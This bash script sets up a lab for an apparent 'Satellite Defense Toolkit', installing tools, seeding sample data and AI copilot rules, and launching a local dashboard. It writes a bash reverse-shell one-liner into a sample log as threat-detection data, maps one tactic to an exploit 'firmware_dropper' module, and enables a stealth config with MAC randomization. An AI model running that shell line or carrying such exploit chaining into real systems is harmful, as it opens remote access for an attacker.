#!/bin/bash

# Satellite Defense Toolkit: Full Lab Setup Script
# Prepares system, installs dependencies, sets stealth mode, CI/CD, Copilot

set -euo pipefail

echo "[+] Updating and installing core packages..."
sudo apt update && sudo apt install -y \
  git python3 python3-pip python3-venv \
  docker.io qemu-system-arm \
  rtl-sdr build-essential \
  iptables net-tools curl unzip \
  xdg-utils jq

echo "[+] Creating Python virtual environment..."
python3 -m venv .venv
source .venv/bin/activate

echo "[+] Installing Python libraries..."
pip install --upgrade pip
pip install \
  flask flask-socketio websocket-client websockets \
  transformers torch torchaudio openai \
  psutil rich pyyaml opencv-python Pillow numpy \
  vosk pyttsx3 stix2 taxii2-client yara-python

echo "[+] Creating required directory structure..."
mkdir -p logs/dashboard logs/ota_streams logs/cicd_hooks
mkdir -p results sandbox pcaps observables threat_feeds
mkdir -p webgui_web config copilot

echo "[+] Creating example memory file..."
dd if=/dev/urandom of=/tmp/mem.bin bs=1M count=1

echo "[+] Simulating OTA binary stream..."
dd if=/dev/urandom of=logs/ota_streams/ota_stream.bin bs=4K count=10

echo "[+] Creating log sample for threat detection..."
echo "Suspicious shell execution: bash -i >& /dev/tcp/1.2.3.4/443 0>&1" > logs/sample.log

echo "[+] Generating MITRE map JSON..."
cat <<EOF > results/mitre_map.json
{
  "Execution": {
    "Command-Line Interface": "$(date -Iseconds)"
  },
  "Persistence": {
    "Startup Folder": "$(date -Iseconds)"
  }
}
EOF

echo "[+] Defining observed tactics for AI/Copilot logic..."
echo '["command-line interface", "startup folder"]' > observables/observed_tactics.json

echo "[+] Creating stealth mode toggle config..."
cat <<EOF > config/stealth_mode.json
{
  "enabled": true,
  "quiet_logging": true,
  "mac_randomization": true,
  "avoid_cloud": true
}
EOF

echo "[+] Seeding AI Copilot chaining rules..."
cat <<EOF > copilot/chaining_rules.json
{
  "command-line interface": ["modules/defense/firmware_signature_validator.py"],
  "startup folder": ["modules/exploits/firmware_dropper.py"],
  "OTA stream detected": ["modules/defense/firmware_memory_shield.py"]
}
EOF

echo "[+] Adding Git post-merge hook for auto dashboard redeploy..."
mkdir -p .git/hooks
cat <<'EOF' > .git/hooks/post-merge
#!/bin/bash
echo "[✓] Git post-merge: restarting dashboard..."
pkill -f webgui_web/app.py || true
nohup python3 webgui_web/app.py > logs/dashboard/restart.log 2>&1 &
EOF
chmod +x .git/hooks/post-merge

echo "[+] Launching dashboard..."
nohup python3 webgui_web/app.py > logs/dashboard/server.log 2>&1 &
sleep 3

if command -v xdg-open >/dev/null 2>&1; then
  echo "[+] Opening dashboard in browser..."
  xdg-open http://localhost:5000 || true
fi

echo "[✓] Satellite Defense Toolkit lab setup complete."
echo "    Dashboard running at http://localhost:5000"
